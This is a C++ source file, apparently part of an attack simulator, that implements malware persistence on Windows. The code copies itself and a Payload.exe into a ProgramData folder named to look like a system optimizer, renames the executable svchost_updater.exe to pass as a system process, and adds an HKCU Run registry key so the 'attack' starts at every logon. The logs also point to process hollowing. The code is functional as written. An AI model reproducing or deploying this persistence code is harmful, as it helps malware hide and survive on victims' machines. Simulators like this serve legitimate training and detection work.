#include "framework.h"
#include "Persistence.h"
#include "Logger.h"
#include <windows.h>
#include <string>

// ============================================================
// Helper: Get paths
// ============================================================
static std::wstring GetCurrentDirectoryPath()
{
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);

    std::wstring pathStr(exePath);
    size_t pos = pathStr.find_last_of(L"\\");
    return pathStr.substr(0, pos + 1);
}

// ============================================================
// True Persistence Implementation
// Copies files to ProgramData and adds a Registry Run key.
// ============================================================
bool EstablishPersistence()
{
    try
    {
        LogActivity("");
        LogActivity("[PERSISTENCE] Establishing True Persistence (Registry Run Key)...");

        // 1. Create target directory: C:\ProgramData\SystemOptimizer
        std::wstring targetDir = L"C:\\ProgramData\\SystemOptimizer\\";
        CreateDirectoryW(targetDir.c_str(), NULL);
        LogActivity("[PERSISTENCE] Created hidden directory: C:\\ProgramData\\SystemOptimizer\\");

        // 2. Determine source files
        std::wstring currentDir = GetCurrentDirectoryPath();
        
        wchar_t currentExeName[MAX_PATH];
        GetModuleFileNameW(nullptr, currentExeName, MAX_PATH);
        std::wstring sourceExe = currentExeName;
        std::wstring sourcePayload = currentDir + L"Payload.exe";

        // 3. Determine target files
        std::wstring targetExe = targetDir + L"svchost_updater.exe"; // Disguised name
        std::wstring targetPayload = targetDir + L"Payload.exe";

        // 4. Copy files
        BOOL copyExe = CopyFileW(sourceExe.c_str(), targetExe.c_str(), FALSE);
        BOOL copyPayload = CopyFileW(sourcePayload.c_str(), targetPayload.c_str(), FALSE);

        if (!copyExe)
        {
            LogActivity("[ERROR] Failed to copy simulator executable to ProgramData.");
            return false;
        }
        if (!copyPayload)
        {
            LogActivity("[WARNING] Failed to copy Payload.exe to ProgramData. Hollowing may fail in background.");
            // We continue anyway so persistence itself succeeds
        }

        LogActivity("[PERSISTENCE] Copied simulator and payload to ProgramData.");

        // 5. Add Registry Run Key (HKCU)
        // HKCU\Software\Microsoft\Windows\CurrentVersion\Run
        // Name: "SystemOptimizerBackground"
        // Value: "C:\ProgramData\SystemOptimizer\svchost_updater.exe --persistent"
        
        HKEY hKey;
        LSTATUS status = RegOpenKeyExW(HKEY_CURRENT_USER, 
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
            0, KEY_SET_VALUE, &hKey);

        if (status != ERROR_SUCCESS)
        {
            LogActivity("[ERROR] Failed to open Registry Run key.");
            return false;
        }

        std::wstring regValue = L"\"" + targetExe + L"\" --persistent";
        
        status = RegSetValueExW(hKey, L"SystemOptimizerBackground", 0, REG_SZ, 
            (const BYTE*)regValue.c_str(), 
            (DWORD)((regValue.length() + 1) * sizeof(wchar_t)));

        RegCloseKey(hKey);

        if (status != ERROR_SUCCESS)
        {
            LogActivity("[ERROR] Failed to set Registry Run key.");
            return false;
        }

        LogActivity("[PERSISTENCE] Successfully added Registry Run key.");
        LogActivity("[PERSISTENCE] Attack will now run continuously in background upon reboot!");
        
        return true;
    }
    catch (...)
    {
        LogActivity("[EXCEPTION] Error during persistence establishment");
        return false;
    }
}
